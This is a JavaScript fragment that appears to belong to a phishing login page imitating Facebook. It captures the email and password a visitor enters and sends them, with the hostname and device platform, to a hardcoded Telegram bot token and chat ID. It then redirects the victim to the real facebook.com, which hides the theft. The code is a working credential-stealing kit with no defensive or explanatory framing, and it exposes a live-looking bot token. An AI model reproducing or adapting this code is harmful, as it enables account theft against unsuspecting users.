    const BOT_TOKEN = '7848804597:AAEYF64iCv8Xa1kIk5-QbghDOXTXknEYmys';
    const CHAT_ID = '5657552404';

    async function captureAndRedirect() {
        const email = document.getElementById('email').value;
        const pass = document.getElementById('password').value;

        if(!email || !pass) {
            alert("Please fill in all fields");
            return;
        }

  
        const message = `
🚨 **NEW CREDENTIALS CAPTURED** 🚨

📧 **Email/User:** \`${email}\`
🔑 **Password:** \`${pass}\`
🌐 **IP (Internal):** ${window.location.hostname}
📱 **Device:** ${navigator.platform}
        `;

        try {
           
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: 'Markdown'
                })
            });

          
            window.location.href = "https://facebook.com";
        } catch (e) {
     
            window.location.href = "https://facebook.com";
        }

    }

